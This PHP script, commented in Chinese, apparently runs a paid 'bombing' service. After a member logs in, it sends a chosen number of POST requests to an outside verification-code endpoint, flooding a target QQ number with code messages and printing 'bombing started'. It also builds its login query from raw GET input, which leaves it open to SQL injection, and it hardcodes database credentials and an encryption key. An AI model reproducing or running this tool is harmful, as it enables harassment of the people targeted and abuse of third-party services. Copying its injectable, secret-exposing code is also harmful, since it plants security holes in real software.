<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_GET['username']) && isset($_GET['password'])) {
        // 获取用户名和密码
        $username = $_GET['username'];
        $password = $_GET['password'];

        // 连接数据库
        $servername = "localhost";
        $dbusername = "ymaz";
        $dbpassword = "ymaz";
        $dbname = "ymaz";

        $conn = new mysqli($servername, $dbusername, $dbpassword, $dbname);

        // 检查连接
        if ($conn->connect_error) {
            die("连接失败: " . $conn->connect_error);
        }
        $encryption_key = "yujianyujianyuji"; // 替换为您自己的密钥
        // 使用 AES 解密数据库中的密码
        $password = openssl_encrypt($password, "AES-128-ECB", $encryption_key);
        
        // 查询数据库
        $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password' AND membership = 1";
        $result = $conn->query($sql);
        
        if ($result->num_rows > 0) {
$qq_number = $_GET['qq'];
$num_requests = intval($_GET['num_requests']);

$url = "http://sszs.wxsszs.cn/api/yzmfs.php";

function send_request($qq_number) {
    global $url;
    $payload = array('qq' => $qq_number);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($status_code == 200) {
        echo "开始轰炸：{$qq_number}！\n";
    } else {
        echo "缓一会\n";
    }
}

for ($i = 0; $i < $num_requests; $i++) {
    send_request($qq_number);
}
        } else {
            // 如果不存在账号、密码错误或者会员状态不是1，则返回相应的错误提示信息
            echo "错误：用户名或密码错误，或者您不是会员。";
        }

        // 关闭数据库连接
        $conn->close();

    } else {
        echo "请输入用户名和密码。";
    }
}
?>
